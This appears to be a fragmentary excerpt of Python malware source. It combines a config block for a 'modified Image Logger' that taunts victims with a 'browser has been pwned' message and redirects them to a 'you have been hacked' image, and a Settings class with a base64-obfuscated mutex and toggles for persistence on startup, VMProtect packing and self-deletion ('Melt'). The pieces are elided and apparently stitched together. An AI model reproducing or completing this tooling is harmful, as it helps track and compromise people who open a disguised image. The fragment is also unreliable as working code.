...
config = {
    ...
    "message": { # Show a custom message when the user opens the image
        ...
        "message": "This browser has been pwned by a modified Image Logger. Duckyrl on Discord", # Message to show
    ...
    "redirect": {
        ...
        "page": "https://imgs.search.brave.com/NqyQgr8oD4Pm29WCEDeOPbxuWeFmJobsKgjJ6PCkBkQ/rs:fit:500:0:0:0/g:ce/aHR0cHM6Ly9jZG4t/MC5hc2tsZW8uY29t/L3dwLWNvbnRlbnQv/dXBsb2Fkcy8yMDE4/LzA1L3lvdS1oYXZl/LWJlZW4taGFja2Vk/LmpwZz9lemltZ2Zt/dD1uZzp3ZWJwL25n/Y2IxL3JzOmRldmlj/ZS9yc2NiMS0x" # Link to the webpage to redirect to 
    },
...
class Settings:
    ...
    Mutex = base64.b64decode('bmFRRzFHOTFZelZPempRMw==').decode()
    PingMe = bool('true')
    Vmprotect = bool('')
    Startup = bool('')
    Melt = bool('')
